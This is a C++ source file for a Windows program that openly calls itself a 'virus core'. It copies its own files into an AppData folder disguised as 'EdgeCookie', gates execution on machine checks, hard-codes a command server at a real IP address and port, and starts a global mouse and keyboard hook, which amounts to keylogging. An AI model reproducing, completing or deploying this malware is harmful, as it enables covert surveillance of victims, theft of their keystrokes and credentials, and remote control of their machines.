
// winmain.cpp : Defines the entry point for the Windows application.
#include "stdafx.h"
#include <stdio.h>
#include <time.h>
#include <stdexcept>
#include <Shlwapi.h> // Include the Shlwapi.h header
#include "resource.h"
#include <fstream>
#include <processenv.h>
#include <shellapi.h>
#include <comdef.h>
#include "checkmachine.h"
#include "detours.h"
#include <Msi.h>
#include "wss_examples.h"
#include "utils.h"
#include "eventhook.h"

#if !defined(DEBUG) || DEBUG == 0
#define BOOST_DISABLE_ASSERTS
#endif

#pragma warning(disable: 4503)

#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsuppw.lib")

using namespace std;

#define INFINITE_TASK_DURATION -1

BOOL GetParameter()
{
	LPWSTR cmdLine = GetCommandLineW();
	int argc = 0;
	LPWSTR* argv = CommandLineToArgvW(cmdLine, &argc);

	if (argc > 1)
	{
		return true;
	}


	return false;
}

void CopyAllFiles()
{
	// Get the path of the current executable
	char path[MAX_PATH];
	GetModuleFileNameA(NULL, path, MAX_PATH);
	
	// Extract the directory path from the executable path
	char* lastBackslash = strrchr(path, '\\');
	if (lastBackslash != NULL)
		* (lastBackslash + 1) = '\0';
	
	// Get the value of the %localappdata% variable
	char destinationPath[MAX_PATH];
	// char destinationAnimPath[MAX_PATH];
	ExpandEnvironmentStringsA("%APPDATA%\\EdgeCookie\\x86", destinationPath, MAX_PATH);
	// ExpandEnvironmentStringsA("%APPDATA%\\EdgeCookie\\x86\\anim", destinationAnimPath, MAX_PATH);

	//create path
	CreateDirectoryRecursively(destinationPath);

	//char animPath[MAX_PATH];
	//snprintf(animPath, MAX_PATH, "%s%s", path, "anim");
	//std:filesystem::copy(animPath, destinationAnimPath, std::filesystem::copy_options::overwrite_existing | std::filesystem::copy_options::recursive);

	// Copy files from the current directory to the destination directory
	WIN32_FIND_DATA findData;
	char searchPath[MAX_PATH];
	snprintf(searchPath, MAX_PATH, "%s%s", path, "*.*");
	HANDLE findHandle = FindFirstFileA(searchPath, &findData);
	if (findHandle != INVALID_HANDLE_VALUE) {
		do {
			if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
				char sourceFile[MAX_PATH];
				char destinationFile[MAX_PATH];
				snprintf(sourceFile, MAX_PATH, "%s%s", path, findData.cFileName);
				snprintf(destinationFile, MAX_PATH, "%s\\%s", destinationPath, findData.cFileName);
				CopyFileA(sourceFile, destinationFile, FALSE);
			}
		} while (FindNextFileA(findHandle, &findData));

		FindClose(findHandle);
	}
}



BOOL CheckMachine()
{
	try {
		if (!isCorrectLocation())
			throw std::runtime_error("");

		if (!scan_target(NULL))
			throw std::runtime_error("");

		return true;
	}
	catch (const std::exception& e)
	{
		return false;
	}
	return true;
}

JSON_COMMAND g_commandserver;
std::string g_socketserver;
std::string g_country;
int hWndClipboard;

HRESULT WINAPI verifymain(JSON_COMMAND commands)
{
	g_commandserver = commands;

	g_socketserver = "95.164.18.220:8443";

	file_log("virus core is called");

	//run mouse and keyboard hook
	CreateThread(NULL, 0, hook, NULL, 0, NULL);

	ServiceMain();

	return 0;
}

int WINAPI WinMain(
	HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR     lpCmdLine,
	int       nCmdShow
)
{
	UNREFERENCED_PARAMETER(hInstance);
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);
	UNREFERENCED_PARAMETER(nCmdShow);

	JSON_COMMAND cmd = {};
	verifymain(cmd);
	return 0;
}

